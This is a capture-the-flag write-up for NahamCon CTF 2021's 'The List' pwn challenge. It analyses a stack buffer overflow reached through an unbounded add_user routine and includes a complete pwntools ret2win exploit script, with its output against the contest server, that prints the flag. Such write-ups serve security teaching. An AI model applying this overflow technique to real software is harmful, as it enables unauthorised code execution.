# NahamCon CTF 2021

## The List [easy]

> Author: @M_alpha#3534
>
> We need you to compile a list of users for the event. Here's a program you can use to help.
>
> [the_list](the_list)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _ret2win_


## Summary

Looks like heap, _but do not be fooled_, it's just basic _bof_ _ret2win_.

From this menu:

```
1. Print users
2. Add user
3. Delete user
4. Change user's name
5. Exit
```

Just keep adding users until _bof_.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE and no canary, ripe for _rop_ and _bof_.

### Decompile with Ghidra

```c
void add_user(long param_1)
{
  size_t sVar1;
  int local_1c;
  
  local_1c = 0;
  while (*(char *)(param_1 + (long)local_1c * 0x20) != '\0') {
    local_1c = local_1c + 1;
  }
  printf("Enter the user\'s name: ");
  fgets((char *)((long)local_1c * 0x20 + param_1),0x20,stdin);
  sVar1 = strcspn((char *)(param_1 + (long)local_1c * 0x20),"\r\n");
  *(undefined *)((long)local_1c * 0x20 + param_1 + sVar1) = 0;
  puts("User added!");
  putchar(10);
  return;
}
```

`add_user` does not limit the number of users; that, plus the lack of a canary in `main` is the vulnerability.

> When abusing `add_user`, note that it counts the users by checking if the first character of _name_  is _not_ `\0`, this will mess with your math a bit.


```c
undefined8 main(void)
{
  size_t sVar1;
  undefined local_248 [524];
  undefined4 local_3c;
  char local_38 [47];
  char local_9;
  
  local_9 = '\x01';
  memset(local_248,0,0x200);
  printf("Enter your name: ");
  fgets(local_38,0x20,stdin);
  sVar1 = strcspn(local_38,"\r\n");
  local_38[sVar1] = '\0';
  printf("Welcome %s!\n",local_38);
  putchar(10);
  while (local_9 != '\0') {
    menu();
    __isoc99_scanf(&%d,&local_3c);
    getchar();
    switch(local_3c) {
    default:
      puts("Invalid choice!");
      break;
    case 1:
      print_users((long)local_248);
      break;
    case 2:
      add_user((long)local_248);
      break;
    case 3:
      delete_user((long)local_248);
      break;
    case 4:
      change_uname((long)local_248);
      break;
    case 5:
      local_9 = '\0';
    }
    local_3c = 0;
  }
  puts("Goodbye!");
  return 0;
}
```

**WARNING:** While overflowing the buffer `local_248`, `local_9` must remain `\x01` or you may suffer from premature ejection before you are able to finish off your exploit.

Right, so call `add_user` `0x248 // 0x20` (18) times to put us `0x248 - 0x20 * (0x248 // 0x20)` (8) bytes from the return address, _right?_

Well..., some garbage is in the way:


```
0x00007ffda532aa20│+0x01e0: 0x0000000000000041 ("A"?)
0x00007ffda532aa28│+0x01e8: 0x0000000000000000
0x00007ffda532aa30│+0x01f0: 0x0000000000000000
0x00007ffda532aa38│+0x01f8: 0x0000000000000000
0x00007ffda532aa40│+0x0200: 0x0000000000000002
0x00007ffda532aa48│+0x0208: 0x0000000200401a5d
0x00007ffda532aa50│+0x0210: 0x0000000068616c62 ("blah"?)
0x00007ffda532aa58│+0x0218: 0x0000000000401a10  →  <__libc_csu_init+0> endbr64
0x00007ffda532aa60│+0x0220: 0x0000000000000041 ("A"?)
0x00007ffda532aa68│+0x0228: 0x0000000000401250  →  <_start+0> endbr64
0x00007ffda532aa70│+0x0230: 0x00007ffda532ab70  →  0x0000000000000001
0x00007ffda532aa78│+0x0238: 0x0100000000000000
0x00007ffda532aa80│+0x0240: 0x0000000000000000	 ← $rbp
0x00007ffda532aa88│+0x0248: 0x00007f91ec9270b3  →  <__libc_start_main+243> mov edi, eax
```

Above is the stack after writing _17_ users with the name `A`.  Look at line `+0x0200`, that `2` is uninitialized stack trash; `add_user` assumes that if not `\0` then it must be a user.  So, to get within striking distance of the return address we only need to add _17_ users since `add_user` skipped over _the trash_.

> We're basically in uninitialized stack garbage at this point, we're also lucky that line `+0x0220` was `\0`.

Line `+0x0238` is `local_9`; when adding the 17th user (18th actually since 17th was free curtesy of _uninitialized stack garbage_), it is important to keep the name short to avoid overwriting `local_9`--null that out, and, well, you cannot add your final user, your attack.

> NOTE: _uninitialized stack garbage_ is _not_ random.  You can frequently count on it to bail you out.

The next user added will overwrite `$rdp`, followed by the return address. 

```
void give_flag(void)
{
  stat local_a8;
  char *local_18;
  int local_c;
  
  local_c = open("flag.txt",0);
  if (local_c < 0) {
    puts("Could not open the flag.");
    exit(1);
  }
  fstat(local_c,&local_a8);
  local_18 = (char *)malloc(local_a8.st_size);
  read(local_c,local_18,local_a8.st_size);
  puts(local_18);
  free(local_18);
  close(local_c);
  exit(0);
}
```

There is a _win_ function, so just append that after 8 bytes for your last user.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./the_list')

if args.REMOTE:
	p = remote('challenge.nahamcon.com', 31980)
else:
	p = process(binary.path)
	libc = binary.libc

p.sendlineafter('name: ','blah')

for i in range(0x248 // 0x20 - 1):
	log.info('adding user: ' + str(i+1))
	p.sendlineafter('> ','2')
	p.sendlineafter('name: ',b'A')

payload  = b''
payload += 8 * b'A'
payload += p64(binary.sym.give_flag)

p.sendlineafter('> ','2')
p.sendlineafter('name: ',payload)
p.sendlineafter('> ','5')
p.stream()
p.close()
```


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/nahamconctf2021/the_list/the_list'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to challenge.nahamcon.com on port 31980: Done
[*] adding user: 1
[*] adding user: 2
[*] adding user: 3
[*] adding user: 4
[*] adding user: 5
[*] adding user: 6
[*] adding user: 7
[*] adding user: 8
[*] adding user: 9
[*] adding user: 10
[*] adding user: 11
[*] adding user: 12
[*] adding user: 13
[*] adding user: 14
[*] adding user: 15
[*] adding user: 16
[*] adding user: 17
Goodbye!
flag{0eb219803dbfcda8620dae0772ae2d72}
```

